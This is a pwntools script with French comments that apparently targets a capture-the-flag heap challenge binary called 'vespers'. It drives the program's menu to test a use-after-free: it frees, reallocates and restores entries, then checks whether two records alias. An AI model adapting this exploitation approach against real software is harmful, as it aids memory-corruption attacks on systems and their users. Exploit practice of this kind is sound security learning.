from pwn import *

# Configuration
context.binary = ELF('./vespers')
context.terminal = ['tmux', 'splitw', '-h']

# Lancer avec le bon loader
p = process(['./ld-2.35.so', '--library-path', '.', './vespers'], 
            stdin=PIPE, stdout=PIPE, stderr=PIPE)

def recv_until(p, delim):
    data = b''
    while not data.endswith(delim):
        data += p.recv(1)
    return data

def send_line(p, line):
    p.sendline(line)

def recruit(p, name, style, tlen, transcript):
    send_line(p, b'1')  # Recruit
    recv_until(p, b': ')
    send_line(p, name)
    recv_until(p, b': ')
    send_line(p, str(style).encode())
    recv_until(p, b': ')
    send_line(p, str(tlen).encode())
    recv_until(p, b': ')
    p.send(transcript)
    recv_until(p, b'\n')

def retire(p, idx):
    send_line(p, b'2')  # Retire
    recv_until(p, b': ')
    send_line(p, str(idx).encode())
    recv_until(p, b'\n')

def restore(p, idx):
    send_line(p, b'3')  # Restore
    recv_until(p, b': ')
    send_line(p, str(idx).encode())
    recv_until(p, b'\n')

def inscribe(p, idx, data):
    send_line(p, b'4')  # Inscribe
    recv_until(p, b': ')
    send_line(p, str(idx).encode())
    recv_until(p, b': ')
    p.send(data)
    recv_until(p, b'\n')

def recite(p, idx):
    send_line(p, b'5')  # Recite
    recv_until(p, b': ')
    send_line(p, str(idx).encode())
    recv_until(p, b'Transcript')
    data = recv_until(p, b'\n')
    return data

def rename(p, idx, new_name):
    send_line(p, b'6')  # Rename
    recv_until(p, b': ')
    send_line(p, str(idx).encode())
    recv_until(p, b': ')
    p.send(new_name)
    recv_until(p, b'\n')

def roster(p):
    send_line(p, b'7')  # Roster
    recv_until(p, b'\n')
    data = recv_until(p, b'--- Choir Ledger ---')
    return data

def perform(p):
    send_line(p, b'8')  # Perform
    recv_until(p, b'=== The Final Performance begins ===')
    data = recv_until(p, b'=== The choir falls silent ===')
    return data

def leave(p):
    send_line(p, b'9')

# Test UAF
log.info("Test UAF...")

# Recruter choriste 0 avec transcript de 0x20 bytes
recruit(p, b'A' * 56, 0, 0x20, b'A' * 0x20)
log.info("Choriste 0 recruté")

# Retirer choriste 0
retire(p, 0)
log.info("Choriste 0 retiré")

# Recruter choriste 1 avec même taille
recruit(p, b'B' * 56, 0, 0x20, b'B' * 0x20)
log.info("Choriste 1 recruté")

# Restaurer choriste 0 (UAF!)
restore(p, 0)
log.info("Choriste 0 restauré (UAF)")

# Maintenant, essayons de voir si choir[0] et choir[1] pointent vers la même chose
# En écrivant via rename sur 0, on devrait affecter 1

# D'abord, voyons le roster
log.info("Roster:")
print(roster(p).decode())

# Essayons de reciter le transcript de 0
log.info("Recite choriste 0:")
data = recite(p, 0)
print(data)

# Recite choriste 1
log.info("Recite choriste 1:")
data = recite(p, 1)
print(data)

leave(p)
p.close()